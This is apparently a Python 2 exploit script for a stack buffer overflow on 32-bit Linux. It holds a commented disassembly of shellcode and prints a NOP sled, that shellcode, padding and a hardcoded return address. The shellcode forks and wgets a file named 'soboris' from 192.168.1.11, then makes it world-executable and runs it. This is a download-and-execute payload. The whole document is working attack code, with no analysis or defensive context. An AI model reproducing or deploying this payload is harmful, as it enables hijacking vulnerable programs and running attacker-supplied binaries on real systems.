#!/usr/bin/python
'''
08048060 <_start>:
 8048060:	eb 4f                	jmp    80480b1 <path>

08048062 <soboris>:
 8048062:	5e                   	pop    %esi
 8048063:	31 c0                	xor    %eax,%eax
 8048065:	b0 02                	mov    $0x2,%al
 8048067:	cd 80                	int    $0x80
 8048069:	31 db                	xor    %ebx,%ebx
 804806b:	39 d8                	cmp    %ebx,%eax
 804806d:	74 57                	je     80480c6 <child>
 804806f:	31 c0                	xor    %eax,%eax
 8048071:	b0 07                	mov    $0x7,%al
 8048073:	cd 80                	int    $0x80
 8048075:	31 c0                	xor    %eax,%eax
 8048077:	31 d2                	xor    %edx,%edx
 8048079:	b0 a2                	mov    $0xa2,%al
 804807b:	52                   	push   %edx
 804807c:	6a 02                	push   $0x2
 804807e:	89 e3                	mov    %esp,%ebx
 8048080:	89 d1                	mov    %edx,%ecx
 8048082:	cd 80                	int    $0x80
 8048084:	31 c0                	xor    %eax,%eax
 8048086:	31 d2                	xor    %edx,%edx
 8048088:	88 56 07             	mov    %dl,0x7(%esi)
 804808b:	8d 1e                	lea    (%esi),%ebx
 804808d:	b0 0f                	mov    $0xf,%al
 804808f:	66 b9 ff 01          	mov    $0x1ff,%cx
 8048093:	cd 80                	int    $0x80
 8048095:	31 c0                	xor    %eax,%eax
 8048097:	89 76 08             	mov    %esi,0x8(%esi)
 804809a:	89 46 0c             	mov    %eax,0xc(%esi)
 804809d:	8d 1e                	lea    (%esi),%ebx
 804809f:	b0 0b                	mov    $0xb,%al
 80480a1:	8d 4e 08             	lea    0x8(%esi),%ecx
 80480a4:	8d 56 0c             	lea    0xc(%esi),%edx
 80480a7:	cd 80                	int    $0x80
 80480a9:	31 c0                	xor    %eax,%eax
 80480ab:	b0 01                	mov    $0x1,%al
 80480ad:	31 db                	xor    %ebx,%ebx
 80480af:	cd 80                	int    $0x80

080480b1 <path>:
 80480b1:	e8 ac ff ff ff       	call   8048062 <soboris>
 80480b6:	73 6f                	jae    8048127 <_end+0x23>
 80480b8:	62 6f 72             	bound  %ebp,0x72(%edi)
 80480bb:	69 73 3d 3d 3d 3d 3d 	imul   $0x3d3d3d3d,0x3d(%ebx),%esi
 80480c2:	3d 3d 3d 3d 6a       	cmp    $0x6a3d3d3d,%eax

080480c6 <child>:
 80480c6:	6a 0b                	push   $0xb
 80480c8:	58                   	pop    %eax
 80480c9:	99                   	cltd   
 80480ca:	52                   	push   %edx
 80480cb:	68 6f 72 69 73       	push   $0x7369726f
 80480d0:	68 2f 73 6f 62       	push   $0x626f732f
 80480d5:	68 31 2e 31 31       	push   $0x31312e31
 80480da:	68 31 36 38 2e       	push   $0x2e383631
 80480df:	68 31 39 32 2e       	push   $0x2e323931
 80480e4:	89 e1                	mov    %esp,%ecx
 80480e6:	52                   	push   %edx
 80480e7:	6a 74                	push   $0x74
 80480e9:	68 2f 77 67 65       	push   $0x6567772f
 80480ee:	68 2f 62 69 6e       	push   $0x6e69622f
 80480f3:	68 2f 75 73 72       	push   $0x7273752f
 80480f8:	89 e3                	mov    %esp,%ebx
 80480fa:	52                   	push   %edx
 80480fb:	51                   	push   %ecx
 80480fc:	53                   	push   %ebx
 80480fd:	89 e1                	mov    %esp,%ecx
 80480ff:	cd 80                	int    $0x80
'''

nopsled = '90' * (524 - 161)
shellcode = (
'EB4F5E31C0B002CD8031DB39D8745731' + 
'C0B007CD8031C031D2B0A2526A0289E3' + 
'89D1CD8031C031D28856078D1EB00F66' + 
'B9FF01CD8031C089760889460C8D1EB0' + 
'0B8D4E088D560CCD8031C0B00131DBCD' + 
'80E8ACFFFFFF736F626F7269733D3D3D' + 
'3D3D3D3D3D3D6A0B589952686F726973' + 
'682F736F6268312E3131683136382E68' + 
'3139322E89E1526A74682F776765682F' + 
'62696E682F75737289E352515389E1CD' + 
'80')

padding = '90' * 4
eip = 'b0e6ffbf'
print nopsled + shellcode + padding + eip

